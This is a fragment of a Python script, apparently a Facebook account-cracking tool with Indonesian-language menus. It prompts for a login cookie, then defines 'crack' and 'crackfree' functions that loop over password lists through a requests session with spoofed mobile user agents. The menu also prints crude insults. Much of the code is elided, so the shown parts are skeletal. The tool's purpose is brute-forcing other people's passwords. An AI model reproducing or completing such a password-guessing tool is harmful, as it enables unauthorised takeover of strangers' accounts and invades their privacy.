...
────────────────────────────────────────
			...
			{m}•{k}•{h}•{sir} Author : RIZ_ANTI_SC_PREM {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tXNXN SARAN PAKE : [green]MAMA MIA LEZATOS[white] XNXN'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] MASUKAN COKOLATOS NYA  :{asu} ')
...
def menu(my_name,my_id):
	...
	gh = 'github.com/KEPO_AH'
	cetak(nel('\tSelamat Datang [yellow]%s[white] Ngentod'%(my_name)))
	print(f'>> ID SIA : '+str(my_id))
	print(f'>> IP SIA  : {ip}')
	print(f'>> GITHUB TE GABLEG  : {gh}')
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.flush()
	ua = 'Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
	ua2 = 'Mozilla/5.0 (Linux; arm_64; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/102.0.5005.148 YaApp_Android/22.74.1 YaSearchBrowser/22.74.1 BroPP/1.0 SA/3 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
...
def crackfree(idf,pwv):
	...
	sys.stdout.flush()
	ua = 'Mozilla/5.0 (Linux; Android 10; M2006C3MII) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/97.0.4692.70 Mobile Safari/537.36'
	ua2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.71'
	ses = requests.Session()
	for pw in pwv:
		try:
